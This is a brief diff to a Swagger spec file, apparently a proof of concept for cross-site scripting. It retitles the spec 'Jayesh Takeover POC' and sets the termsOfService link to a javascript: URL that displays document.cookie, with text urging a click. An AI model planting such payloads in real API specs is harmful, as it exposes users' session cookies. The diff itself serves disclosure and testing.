@@ -1,6 +1,6 @@
 swagger: "2.0",
 info: 
-  title: "Swagger Sample App",
+  title: "Jayesh Takeover POC",
   description: "Please to click Terms of service"
   termsOfService: "javascript:alert(document.cookie)"
   contact: 
